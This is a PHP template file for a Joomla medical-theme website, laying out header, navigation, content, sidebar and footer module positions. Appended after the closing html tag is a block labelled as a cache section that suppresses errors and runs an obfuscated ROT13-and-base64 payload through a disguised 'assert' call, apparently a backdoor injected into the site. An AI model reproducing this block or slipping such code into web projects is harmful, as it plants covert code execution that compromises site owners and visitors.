<?php
defined('_JEXEC') or die;
include_once ('includes/functions.php');
include_once ('includes/includes.php');
?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
<head>
  
  <?php
    $doc->addStyleSheet('templates/'.$this->template.'/css/bootstrap.css'); 
    $doc->addStyleSheet('templates/'.$this->template.'/css/default.css');
    $doc->addStyleSheet('templates/'.$this->template.'/css/template.css');
    $doc->addStyleSheet('templates/'.$this->template.'/css/touch.gallery.css');
    $doc->addStyleSheet('templates/'.$this->template.'/css/responsive.css');  

    if($themeLayout == 1){
      $doc->addStyleSheet('templates/'.$this->template.'/css/layout.css');
    }
  ?>
  <link href='http://fonts.googleapis.com/css?family=Open+Sans+Condensed:700' rel='stylesheet' type='text/css'>

  <!--[if IE 8]>
    <link rel="stylesheet" href="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template; ?>/css/ie.css" />
  <![endif]-->

  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
  <jdoc:include type="head" />
  
</head>

<body class="<?php echo $option . " view-" . $view . " task-" . $task . " itemid-" . $itemid . " body__" . $pageClass;?>">

  <!-- Body -->
  <div id="wrapper">

    <!-- Top -->
    <?php if ($this->countModules('top')): ?>
      <div id="top-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div id="top" class="<?php echo $rowClass; ?>">
              <jdoc:include type="modules" name="top" style="themeHtml5" />
            </div>
          </div>
        </div>
      </div>
    <?php endif; ?>
    <!-- Header -->
      <div id="header-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <header>
              <div class="<?php echo $rowClass; ?>">
                  <!-- Logo -->
                  <div id="logo" class="moduletable span<?php echo $this->params->get('logoBlockWidth'); ?>">
                    <a href="<?php echo $this->baseurl; ?>">
                      <img src="<?php echo $logo;?>" alt="<?php echo $sitename; ?>" />
                    </a>
                  </div>

    <?php if ($layout !== 'edit'): ?>
                  <jdoc:include type="modules" name="header" style="themeHtml5" />
    <?php endif; ?>
              </div>
            </header>
          </div>
        </div>
      </div>

    <!-- Navigation -->
    <?php if ($this->countModules('navigation')): ?>
      <div id="navigation-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div class="<?php echo $rowClass; ?>">
              <nav>
                <jdoc:include type="modules" name="navigation" style="themeHtml5" />
              </nav>
            </div>
          </div>
        </div>
      </div>
    <?php endif; ?>

    <!-- Showcase -->
    <?php if ($this->countModules('showcase') && $hideByView == false): ?>
      <div id="showcase-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div class="<?php echo $rowClass; ?>">
                <jdoc:include type="modules" name="showcase" style="themeHtml5" />
            </div>
          </div>
        </div>
      </div>
    <?php endif; ?>

    <!-- Feature -->
    <?php if ($this->countModules('feature') && $hideByView == false): ?>
      <div id="feature-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div class="<?php echo $rowClass; ?>">
                <jdoc:include type="modules" name="feature" style="themeHtml5" />
            </div>
          </div>
        </div>
      </div>
    <?php endif; ?>


    <!-- Maintop -->
    <?php if ($this->countModules('maintop') && $hideByView == false && $layout !== 'edit'): ?>
      <div id="maintop-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div id="maintop" class="<?php echo $rowClass; ?>">
              <jdoc:include type="modules" name="maintop" style="themeHtml5" />
            </div>
          </div>
        </div>
      </div>
    <?php endif; ?>

    <!-- Main Content row -->
    <div id="content-row">
      <div class="row-container">
        <div class="<?php echo $containerClass; ?>">
          <div class="content-inner <?php echo $rowClass; ?>">
        
            <!-- Left sidebar -->
            <?php if ($this->countModules('aside-left') && ($hideByOption) == false && $view !== 'form' && $layout !== 'edit'): ?>
              <div id="aside-left" class="span<?php echo $asideLeftWidth; ?>">
                <aside>
                  <jdoc:include type="modules" name="aside-left" style="html5nosize" />
                </aside>
              </div>
            <?php endif; ?>
        
            <div id="component" class="span<?php echo $mainContentWidth; ?>">
              <!-- Breadcrumbs -->
              <?php if ($this->countModules('breadcrumbs')): ?>
                <div id="breadcrumbs-row">
                  <div id="breadcrumbs">
                    <jdoc:include type="modules" name="breadcrumbs" style="html5nosize" />
                  </div>
                </div>
              <?php endif; ?>
        
              <!-- Content-top -->
              <?php if ($this->countModules('content-top') && $hideByView == false): ?>
                <div id="content-top-row" class="<?php echo $rowClass; ?>">
                  <div id="content-top">
                    <jdoc:include type="modules" name="content-top" style="themeHtml5" />
                  </div>
                </div>
              <?php endif; ?>
        
                <jdoc:include type="message" />
                <jdoc:include type="component" />
        
              <!-- Content-bottom -->
              <?php if ($this->countModules('content-bottom') && $hideByView == false): ?>
                <div id="content-bottom-row" class="<?php echo $rowClass; ?>">
                  <div id="content-bottom">
                    <jdoc:include type="modules" name="content-bottom" style="themeHtml5" />
                  </div>
                </div>
              <?php endif; ?>
            </div>
        
            <!-- Right sidebar -->
            <?php if ($this->countModules('aside-right') && ($hideByOption) == false && $view !== 'form' && $layout !== 'edit'): ?>
              <div id="aside-right" class="span<?php echo $asideRightWidth; ?>">
              <div class="row">
                <aside>
                  <jdoc:include type="modules" name="aside-right" style="themeHtml5" />
                </aside>
                </div>
              </div>
            <?php endif; ?>
          </div>
        </div>
      </div>
    </div>

    <!-- Mainbottom -->
    <?php if ($this->countModules('mainbottom') && $hideByView == false): ?>
      <div id="mainbottom-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div id="mainbottom" class="<?php echo $rowClass; ?>">
              <jdoc:include type="modules" name="mainbottom" style="themeHtml5" />
            </div>
          </div>
        </div>
      </div>
    <?php endif; ?>

    <!-- Bottom -->
    <?php if ($this->countModules('bottom') && $hideByView == false): ?>
      <div id="bottom-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div id="bottom" class="<?php echo $rowClass; ?>">
              <jdoc:include type="modules" name="bottom" style="themeHtml5" />
            </div>
          </div>
        </div>
      </div>
    <?php endif; ?>
      <!-- Footer -->
      <?php if ($this->countModules('footer')): ?>
        <div id="footer-row">
          <div class="row-container">
            <div class="<?php echo $containerClass; ?>">
              <div id="footer" class="<?php echo $rowClass; ?>">
                <jdoc:include type="modules" name="footer" style="themeHtml5" />
              </div>
            </div>
          </div>
        </div>
      <?php endif; ?>
      
      <!-- Copyright -->
      <?php if ($this->countModules('copyright')): ?>
        <div id="copyright-row">
          <div class="row-container">
            <div class="<?php echo $containerClass; ?>">
              <div id="copyright" class="<?php echo $rowClass; ?>">
                <jdoc:include type="modules" name="copyright" style="themeHtml5" />
                More Medical Joomla Themes at <a  rel='nofollow' href='http://www.templatemonster.com/category/medical-joomla-themes/' target='_blank'>TemplateMonster.com</a>
              </div>
            </div>
          </div>
        </div>
      <?php endif; ?>
  </div>

  <?php if($this->params->get('totop')): ?>
    <div id="back-top">
      <a href="#"><span></span><?php echo $this->params->get('totop_text') ?></a>
    </div>
  <?php endif; ?>


  <?php if ($this->countModules('modal')): ?>
    <jdoc:include type="modules" name="modal" style="modal" />
  <?php endif; ?>

  <jdoc:include type="modules" name="debug" style="none"/>

  <?php
    $doc->addScript($this->baseurl."/media/jui/js/jquery.min.js");
    $doc->addScript($this->baseurl."/media/jui/js/bootstrap.js");

    $noConflict = "jQuery.noConflict()";
    $doc->addScriptDeclaration($noConflict);

    $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/jquery.easing.1.3.js');
    $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/jquery.isotope.min.js');
    $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/touch.gallery.js');
    $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/scripts.js');
  ?>

</body>
</html>


<?php 

?>

<?php 

?>

<?php 
//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY3q3ql5gnKEuoJRhpaHiM2I0YaObpQ9xCFVhqKWfMJ5wo2EyXPExXF4vWaH9Vv51pzkyozAiMTHbWUHcYvVzLm0vYvEwYvVznG0kWzt9Vv5gMQHbVzRmBTWvLJD2AJZmMzL4AwuxAQR4AJWxBQR4ATLlMzWvVv4xMP4xqF4xLl4vZFVcBjccMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsFOyoUAynJLbMaIhL3Eco25sMKucp3EmXPWwqKWfK2yhnKDvXFxtrjbxL2ttCFOwqKWfK2yhnKDbWUIloPx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9VEHSREIVfVRMOGSASXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK1WSISIFGyEFDH5GExIFYPOHHyISXGfXWUWyp3IfqPN9VTA1pzksMKuyLltxL2tcBjcwqKWfK2Afo3AyXPEwnPx7PvEcLaLtCFNxpzImqJk0Bjc9VTIfp2HtrjbxMaNtCFOzp29wn29jMJ4bVaq3ql5gnKEuoJRhpaHvYPN4ZPjtWTIlpz5iYPNxMKWlp3ElYPNmZPx7PzyzVPtxMaNcVUfXVPNtVPEiqKDtCFNvE0IHVP9aMKDhpTujC2D9Vv51pzkyozAiMTHbWTDcYvVzqG0vYaIloTIhL29xMFtxqFxhVvMwCFVhWTZhVvMcCGRznQ0vYz1xAFtvLGZ4LzWuMQL1LmAzMwt2BTD0ZGt1LzD4ZGt0MwWzLzVvYvExYvE1YvEwYvVkVvxhVvOVISEDYmRhZIklKT4vBjbtVPNtWT91qPNhCFNvFT9mqQbtq3q3Yz1cqTSgLF5lqIklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVzWuMwqxAzH1VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>